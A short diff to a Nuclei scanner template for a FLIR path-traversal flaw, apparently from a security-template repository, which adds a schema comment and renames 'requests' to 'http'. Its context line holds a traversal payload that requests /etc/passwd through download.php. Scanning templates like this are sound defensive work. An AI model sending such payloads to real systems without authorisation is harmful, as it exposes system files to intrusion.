@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: flir-path-traversal
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://juejin.cn/post/6961370156484263972
   tags: flir,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?file=/etc/passwd"
